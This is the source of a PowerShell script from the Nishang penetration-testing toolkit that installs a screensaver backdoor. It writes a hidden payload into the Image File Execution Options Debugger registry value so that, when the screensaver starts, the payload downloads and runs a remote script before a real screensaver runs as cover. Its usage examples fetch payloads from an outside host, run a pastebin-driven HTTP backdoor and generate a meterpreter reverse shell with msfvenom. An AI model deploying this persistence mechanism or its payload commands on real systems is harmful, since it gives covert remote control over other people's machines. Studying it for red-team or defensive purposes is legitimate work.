function Add-ScrnSaveBackdoor
{
<#
.SYNOPSIS
Nishang Script which could set Debugger registry keys for a screensaver to remotely execute commands and scripts. 

.DESCRIPTION
The script reads the value of Windows registry key HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE 
to check for the existing Screensaver. If none exists, one from the default ones which exist in C:\Windows\System32 is used.
A Debugger to the screensaver is created at HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\. 
It is the value of the "Debugger" to this key where it writes the payload. A screensaver selected from the default ones is added to this payload.

When the payload is executed, the screensaver also runs after it to make it appear legit. Change the contents of the payload URL
to execute different scripts using the same backdoor.

.PARAMETER Payload
Payload which you want execute on the target.

.PARAMETER PayloadURL
URL of the powershell script which would be executed on the target.

.PARAMETER Arguments
Arguments to the powershell script to be executed on the target.

.PARAMETER NewScreenSaver
Full path to the screensaver to be used if none is being used. Default is C:\Windows\System32\Ribbons.scr

.EXAMPLE
PS > Add-ScrnSaveBackdoor -Payload "powershell.exe -ExecutionPolicy Bypass -noprofile -noexit -c Get-Process"

Use above command to provide your own payload to be executed.


.EXAMPLE
PS > Add-ScrnSaveBackdoor -PayloadURL http://192.168.254.1/FireBuster.ps1 -Arguments "FireBuster 192.168.254.1 8440-8445"

Use above to execute FireBuster from Nishang for Egress Testing.

.EXAMPLE
PS > Add-ScrnSaveBackdoor -PayloadURL http://192.168.254.1/Powerpreter.psm1 -Arguments HTTP-Backdoor "http://pastebin.com/raw.php?i=jqP2vJ3x http://pastebin.com/raw.php?i=Zhyf8rwh start123 stopthis

Use above to execute HTTP-Backdoor from Powerpreter

.EXAMPLE
PS > Add-ScrnSaveBackdoor -PayloadURL http://192.168.254.1/code_exec.ps1

Use above to execute an in-memory meterpreter in PowerShell format generated using msfvenom 
(./msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.254.226 -f powershell)


.LINK
http://www.labofapenetrationtester.com/2015/02/using-windows-screensaver-as-backdoor.html
https://github.com/samratashok/nishang
#>

    [CmdletBinding()] Param(
        [Parameter(Position = 0, Mandatory = $False)]
        [String]
        $Payload,

        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $PayloadURL,

        [Parameter(Position = 2, Mandatory = $False)]
        [String]
        $Arguments,

        [Parameter(Position = 3, Mandatory = $False)]
        [String]
        $NewScreenSaver = "C:\Windows\System32\Ribbons.scr"
    )
    
    #Check if ScreenSaver is enabled
    #If no enable it, if yes, get its value
    if ((Get-Item "HKCU:\Control Panel\Desktop\").GetValue("SCRNSAVE.EXE") -eq $null)
    {
        New-ItemProperty "HKCU:\Control Panel\Desktop\" -Name SCRNSAVE.EXE -Value $NewScreenSaver -PropertyType String
        $ScreenSaverName = ($NewScreenSaver -split '\\')[-1]
    }
    else
    {
        $ScreenSaverName = ((Get-Item "HKCU:\Control Panel\Desktop\").GetValue("SCRNSAVE.EXE") -split '\\')[-1]
    }

    #Set ScreenSaveTimeOut which is necessary to enable screensaver.
    if ((Get-Item "HKCU:\Control Panel\Desktop\").GetValue("ScreenSaveTimeOut") -eq $null)
    {
        New-ItemProperty "HKCU:\Control Panel\Desktop\" -Name ScreenSaveTimeOut -Value 60 -PropertyType String
    } 
    else
    {
        Set-ItemProperty "HKCU:\Control Panel\Desktop\" -Name ScreenSaveTimeOut -Value 60
    }
    
    #Get a list of default screensavers and select one at random
    $ListScrn = Get-ChildItem C:\Windows\System32\*.scr | Where-Object {$_.Name -ne $ScreenSaverName}
    $PathToScreensaver = Get-Random $ListScrn

    #Add a default screensaver to payload so that it runs after our payload.
    if(!$Payload)
    {
        $RegValue = "powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c IEX ((New-Object Net.WebClient).DownloadString('$PayloadURL'));$Arguments" + ";" + $PathToScreensaver + " /s"
    }
    elseif ($Payload)
    {
        $RegValue = $Payload + ";" + $Arguments + ";" + $PathToScreensaver + " /s"
    }
    #Set Debugger for the ScreenSaver executable
    if (Test-Path -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$ScreenSaverName")
    {
        
        Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$ScreenSaverName" -Name Debugger -Value $RegValue
        Write-Output "Payload added as Debugger for $ScreenSaverName"
    }
    else
    {
        New-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$ScreenSaverName"
        Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$ScreenSaverName" -Name Debugger -Value $RegValue
        Write-Output "Payload added as Debugger for $ScreenSaverName"
    }
}

